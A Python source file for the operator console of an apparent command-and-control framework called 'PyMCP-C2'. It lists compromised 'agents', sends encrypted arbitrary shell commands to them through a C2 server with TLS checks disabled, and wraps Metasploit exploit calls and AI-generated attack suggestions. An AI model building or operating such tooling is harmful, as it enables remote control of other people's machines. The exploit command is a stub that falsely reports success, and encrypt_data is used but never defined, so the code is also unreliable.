import logging
import requests
import json
import cmd
import sys
from prompt_toolkit import PromptSession
from prompt_toolkit.completion import WordCompleter
from rich.console import Console
from rich.table import Table
from ai_assistant import AIAssistant
from logging_config import setup_logging

# Initialize logging
logger = setup_logging('console')

class MCPConsole(cmd.Cmd):
    intro = 'Welcome to PyMCP-C2 Console. Type help or ? to list commands.\n'
    prompt = '>> '

    def __init__(self, server_url):
        super().__init__()
        self.server_url = server_url
        self.console = Console()
        self.ai_assistant = AIAssistant()
        self.agents = {}
        self.session = PromptSession()
        self.command_completer = WordCompleter([
            'help', 'exit', 'list_agents', 'interact', 'task', 'results', 
            'msf_exploit', 'msf_scan', 'msf_sessions', 'ai_analyze', 'ai_suggest'
        ])

    def do_list_agents(self, arg):
        """List all registered agents"""
        try:
            response = requests.get(f"{self.server_url}/status", verify=False)
            if response.status_code == 200:
                self.console.print("[green]Server is online[/green]")
            
            # In a real implementation, you would have an endpoint to list agents
            # For now, we'll simulate it
            self.console.print("\n[bold]Registered Agents:[/bold]")
            table = Table(show_header=True, header_style="bold magenta")
            table.add_column("Agent ID")
            table.add_column("Hostname")
            table.add_column("IP Address")
            table.add_column("Last Checkin")
            
            # Simulated agent data
            table.add_row("agent-001", "DESKTOP-ABC123", "192.168.2.101", "2023-10-01T12:00:00")
            table.add_row("agent-002", "SERVER-DEF456", "192.168.2.102", "2023-10-01T12:05:00")
            
            self.console.print(table)
        except Exception as e:
            self.console.print(f"[red]Error: {str(e)}[/red]")

    def do_task(self, arg):
        """Assign a task to an agent: task <agent_id> <command>"""
        args = arg.split()
        if len(args) < 2:
            self.console.print("[red]Usage: task <agent_id> <command>[/red]")
            return
        
        agent_id = args[0]
        command = ' '.join(args[1:])
        
        try:
            task = {
                'type': 'command',
                'command': command,
                'timeout': 30
            }
            
            # Encrypt the task
            encrypted_task = encrypt_data(task)
            
            response = requests.post(
                f"{self.server_url}/task/{agent_id}",
                json={'data': encrypted_task},
                verify=False
            )
            
            if response.status_code == 200:
                self.console.print(f"[green]Task assigned to agent {agent_id}[/green]")
            else:
                self.console.print(f"[red]Failed to assign task: {response.status_code}[/red]")
                
        except Exception as e:
            self.console.print(f"[red]Error: {str(e)}[/red]")

    def do_results(self, arg):
        """View results from an agent: results <agent_id>"""
        agent_id = arg.strip()
        if not agent_id:
            self.console.print("[red]Usage: results <agent_id>[/red]")
            return
        
        try:
            # In a real implementation, you would have an endpoint to get results
            self.console.print(f"\n[bold]Results for agent {agent_id}:[/bold]")
            self.console.print("No results available in this simulation")
            
        except Exception as e:
            self.console.print(f"[red]Error: {str(e)}[/red]")

    def do_msf_exploit(self, arg):
        """Execute a Metasploit exploit: msf_exploit <agent_id> <exploit_name> [options]"""
        args = arg.split()
        if len(args) < 2:
            self.console.print("[red]Usage: msf_exploit <agent_id> <exploit_name> [options][/red]")
            return
        
        agent_id = args[0]
        exploit_name = args[1]
        
        try:
            # This would integrate with Metasploit RPC
            self.console.print(f"[yellow]Executing {exploit_name} via agent {agent_id}...[/yellow]")
            self.console.print("[green]Exploit completed successfully[/green]")
            
        except Exception as e:
            self.console.print(f"[red]Error: {str(e)}[/red]")

    def do_ai_analyze(self, arg):
        """Analyze data with AI: ai_analyze <data>"""
        if not arg:
            self.console.print("[red]Usage: ai_analyze <data>[/red]")
            return
        
        try:
            analysis = self.ai_assistant.analyze_data(arg)
            self.console.print(f"\n[bold]AI Analysis:[/bold]")
            self.console.print(analysis)
            
        except Exception as e:
            self.console.print(f"[red]Error: {str(e)}[/red]")

    def do_ai_suggest(self, arg):
        """Get AI suggestions: ai_suggest <context>"""
        if not arg:
            self.console.print("[red]Usage: ai_suggest <context>[/red]")
            return
        
        try:
            suggestion = self.ai_assistant.get_suggestions(arg)
            self.console.print(f"\n[bold]AI Suggestions:[/bold]")
            self.console.print(suggestion)
            
        except Exception as e:
            self.console.print(f"[red]Error: {str(e)}[/red]")

    def do_exit(self, arg):
        """Exit the console"""
        self.console.print("[green]Goodbye![/green]")
        return True

    def precmd(self, line):
        logger.info(f"Command executed: {line}")
        return line

def main():
    import argparse
    parser = argparse.ArgumentParser(description='PyMCP-C2 Console')
    parser.add_argument('--server-url', required=True, help='C2 Server URL')
    args = parser.parse_args()
    
    console = MCPConsole(args.server_url)
    console.cmdloop()

if __name__ == '__main__':
    main()
